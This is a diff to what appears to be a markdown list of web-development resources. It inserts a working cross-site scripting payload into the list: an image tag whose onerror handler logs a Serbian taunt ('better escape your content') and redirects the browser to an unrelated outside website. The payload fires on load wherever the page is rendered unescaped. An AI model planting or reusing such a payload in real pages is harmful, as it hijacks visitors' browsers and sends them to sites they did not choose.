@@ -1127,6 +1127,12 @@ Other
 * fundamentals
   * [W3.org](http://www.w3.org/TR/selectors/)
   * [OWASP](https://www.owasp.org/index.php/Category:Attack) nice examples of attack and vulnerability
+
+~~~
+<IMG SRC=/ onerror="console.log('cao. bolje da eskejpujete sadrzaj');location.assign('http://www.iznajmljivanjeprojektoranovisad.in.rs')"></img>
+
+~~~
+  
 * css tools
   * [autoprefixer](https://github.com/ai/autoprefixer-rails)
   * [http://www.browsersync.io/](http://www.browsersync.io/)
